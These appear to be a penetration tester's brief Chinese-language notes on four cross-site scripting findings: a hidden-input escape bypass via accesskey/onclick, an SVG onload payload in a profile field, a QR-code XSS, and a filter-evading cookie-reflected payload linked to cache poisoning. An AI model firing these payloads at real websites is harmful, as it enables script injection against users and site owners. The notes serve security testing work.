1.隐藏输入中的xss（绕过输入转义）
参数，位于post请求中的listViewHeading=
有效负载：" accesskey=X onclick=alert()
![[Pasted image 20241014211401.png]]
" accesskey=X onclick=alert() xxx
![[Pasted image 20241014211445.png]]
success

2.个人主页的项目名称中可以插入xsspayload
```
post
name="><svg onload="prompt(/xss/);"><!--
```

3.二维码xss
二维码执行js

4.cookie里的xss
cookie: hav=xxx 反射到页面上
payload:cookie:  hav=xss"</sc"ript><sv"g/onloa"d=al"ert"(document.do"main)>
缓存投毒，http响应里的头Cache-Control和Expires